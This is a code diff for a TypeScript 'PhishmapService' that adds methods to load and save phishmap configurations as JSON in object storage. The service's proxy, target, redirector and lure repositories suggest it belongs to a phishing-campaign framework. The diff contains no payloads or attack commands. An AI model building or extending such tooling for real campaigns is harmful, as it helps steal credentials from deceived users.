@@ -14,7 +14,15 @@ import {
   TargetRepository
 } from '@famir/database'
 import { ReplServerError } from '@famir/repl-server'
-import { DumpPhishmapData, Phishmap, PrunePhishmapData, RestorePhishmapData } from './phishmap.js'
+import { Storage, STORAGE } from '@famir/storage'
+import {
+  DumpPhishmapData,
+  LoadPhishmapData,
+  Phishmap,
+  PrunePhishmapData,
+  RestorePhishmapData,
+  SavePhishmapData
+} from './phishmap.js'
 
 export const PHISHMAP_SERVICE = Symbol('PhishmapService')
 
@@ -28,7 +36,8 @@ export class PhishmapService {
           c.resolve<ProxyRepository>(PROXY_REPOSITORY),
           c.resolve<TargetRepository>(TARGET_REPOSITORY),
           c.resolve<RedirectorRepository>(REDIRECTOR_REPOSITORY),
-          c.resolve<LureRepository>(LURE_REPOSITORY)
+          c.resolve<LureRepository>(LURE_REPOSITORY),
+          c.resolve<Storage>(STORAGE)
         )
     )
   }
@@ -40,7 +49,8 @@ export class PhishmapService {
     protected readonly proxyRepository: ProxyRepository,
     protected readonly targetRepository: TargetRepository,
     protected readonly redirectorRepository: RedirectorRepository,
-    protected readonly lureRepository: LureRepository
+    protected readonly lureRepository: LureRepository,
+    protected readonly storage: Storage
   ) {
     this.confirmSecret = randomIdent()
   }
@@ -261,7 +271,6 @@ export class PhishmapService {
   }
 
   async prune(data: PrunePhishmapData): Promise<true> {
-    console.log('CONFIRM', { data })
     this.checkConfirmSecret(data.confirmSecret)
 
     let lockSecret: string
@@ -340,6 +349,24 @@ export class PhishmapService {
         code: 'INTERNAL_ERROR'
       })
     }
+
+    return true
+  }
+
+  async load(data: LoadPhishmapData): Promise<unknown> {
+    const objectName = `phishmaps/${data.filename}.json`
+    const value = await this.storage.getObject(objectName)
+
+    return JSON.parse(value.toString())
+  }
+
+  async save(data: SavePhishmapData): Promise<true> {
+    const objectName = `phishmaps/${data.filename}.json`
+    const value = Buffer.from(JSON.stringify(data.phishmap, null, 2))
+
+    await this.storage.putObject(objectName, value, {
+      'Content-Type': 'application/json'
+    })
 
     return true
   }
